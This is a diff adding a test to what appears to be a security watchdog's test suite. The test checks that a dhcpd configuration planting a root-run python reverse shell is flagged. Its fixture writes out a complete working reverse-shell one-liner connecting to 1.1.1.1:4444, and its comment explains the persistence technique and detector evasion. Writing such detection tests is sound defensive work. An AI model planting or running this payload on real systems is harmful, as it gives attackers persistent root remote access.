@@ -278,3 +278,18 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on dhcpd execute() surface)" {
+    # Sister to nc / curl|bash / base64 / dev-tcp dhcpd execute()
+    # rev-shell variants already locked. Beyond bash/sh/nc,
+    # attackers reach for python -c 'import socket,os,pty' to
+    # dodge shell-pattern detectors — python is on every Debian/
+    # Ubuntu DHCP server host. Locks the python axis on the
+    # T1546 DHCP-lease-event-trigger root-exec persistence
+    # surface — dhcpd executes binary AS ROOT on every commit/
+    # release event; planted python rev-shell fires every lease
+    # cycle until detected.
+    printf 'on commit { execute("/bin/sh", "-c", "python -c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\""); }\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
